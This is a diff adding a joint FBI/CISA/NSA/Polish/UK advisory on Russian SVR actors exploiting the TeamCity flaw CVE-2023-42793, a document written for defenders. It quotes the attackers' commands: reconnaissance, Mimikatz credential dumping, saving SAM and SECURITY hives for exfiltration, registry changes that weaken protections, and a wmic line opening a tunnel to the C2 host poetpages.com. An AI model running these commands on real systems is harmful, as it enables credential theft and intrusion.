@@ -1,0 +1,221 @@
+The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.
+
+Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.
+
+To bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.
+
+SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.
+
+A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR’s responsibility to collect political intelligence, the collection of which has long been the SVR’s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.
+
+Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development. Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR’s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.
+
+In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’ networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.
+
+In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.
+
+Note: This advisory uses the MITRE ATT&CK ® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK ® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.
+
+The SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.
+
+Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance,,:
+
+whoami /priv
+
+whoami /all
+
+whoami /groups
+
+whoami /domain
+
+nltest -dclist
+
+nltest -dsgetdc
+
+tasklist
+
+netstat
+
+wmic /node:""<redacted>"" /user:""<redacted>"" /password:""<redacted>"" process list brief
+
+wmic /node:""<redacted>"" process list brief
+
+wmic process get commandline -all
+
+wmic process <proc_id> get commandline
+
+wmic process where name=""GoogleCrashHandler64.exe"" get commandline,processed
+
+powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties
+
+powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties.memberof
+
+powershell Get-WmiObject -Class Win32_Service -Computername
+
+powershell Get-WindowsDriver -Online -All
+
+Additionally, the authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system:
+
+C:\Windows\system32\ntoskrnl.exe to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.
+
+SQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:
+
+C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll,
+
+C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll,
+
+C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll,
+
+C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll
+
+C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\secforwarder.dll
+
+Visual Studio files – based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:
+
+C:\Program Files (x86)\Microsoft Visual Studio\2017\SQL\Common7\IDE\VSIXAutoUpdate.exe
+
+Update management agent files – based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:
+
+C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe
+
+C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd
+
+C:\ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf
+
+Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server,:
+
+powershell Compress-Archive -Path "C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll","C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll","C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll","C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll" -DestinationPath C:\Windows\temp\1\sql.zip
+
+SVR cyber actors also exfiltrated secforwarder.dll
+
+To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software.
+
+This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory.
+
+In several cases SVR attempted to hide their backdoors via:
+
+Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,
+
+Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,
+
+Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.
+
+To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files, illustrated below:
+
+To facilitate privilege escalation, the SVR used multiple techniques, including WinPEAS, NoLMHash registry key modification, and the Mimikatz tool.
+
+The SVR modified the NoLMHash registry using the following reg command:
+
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d "0" /f
+
+The SVR used the following Mimikatz commands:
+
+privilege::debug
+
+lsadump::cache
+
+lsadump::secrets
+
+lsadump::sam
+
+sekurlsa::logonpasswords
+
+The SVR relied on scheduled tasks to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:
+
+C:\Windows\temp
+
+C:\Windows\System32
+
+C:\Windows\WinStore
+
+The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of Compromise.
+
+To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).
+
+The SVR exfiltrated the following Windows Registry hives from its victims:
+
+HKLM\SYSTEM
+
+HKLM\SAM
+
+HKLM\SECURITY
+
+In order to exfiltrate Windows Registry, the SVR saved hives into files, packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage.zip archives in the C:\Windows\Temp\ directory.
+
+reg save HKLM\SYSTEM ""C:\Windows\temp\1\sy.sa"" /y
+
+reg save HKLM\SAM ""C:\Windows\temp\1\sam.sa"" /y
+
+reg save HKLM\SECURITY ""C:\Windows\temp\1\se.sa"" /y
+
+powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q
+
+In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.
+
+SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to obtain a sensitive Domain information.
+
+After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory. The SVR executed the following PowerSploit commands:
+
+Get-NetComputer
+
+Get-NetGroup
+
+Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount"
+
+Get-NetDiDomain
+
+Get-AdUser
+
+Get-DomainUser -UserName
+
+Get-NetUser -PreauthNotRequire
+
+Get-NetComputer | select samaccountname
+
+Get-NetUser -SPN | select serviceprincipalname
+
+In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure.
+
+The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:
+
+65.20.97[.]203:443
+
+Poetpages[.]com:8443
+
+The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) utility after dropping it to disk:
+
+wmic process call create "C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31"
+
+The SVR used WMIC to facilitate lateral movement,.
+
+wmic /node:""<redacted>"" /user:""<redacted>" /password:""<redacted>"" process call create ""rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost""
+
+The SVR also modified DisableRestrictedAdmin key to enable remote connections.
+
+It modified Registry using the following reg command:
+
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d "0" /f
+
+In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:
+
+GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs to exchange data with the SVR operator.
+
+After execution, GraphicalProton gathers environment information such as active TCP/UDP connections, running processes, as well as user, host, and domain names. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results. Directory name is re-randomized each time the GraphicalProton process is started.
+
+BMP files that were used to exchange data were generated in the following way:
+
+Compress data using zlib,
+
+Encrypt data using custom algorithm,
+
+Add “***” string literal to encrypted data,
+
+Create a random BMP with random rectangle,
+
+And finally, encode encrypted data within lower pixel bits.
+
+While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are especially noteworthy – a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf, an open-source C++ build analysis tool from Microsoft.
+
+GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request. To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.
+
+As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.
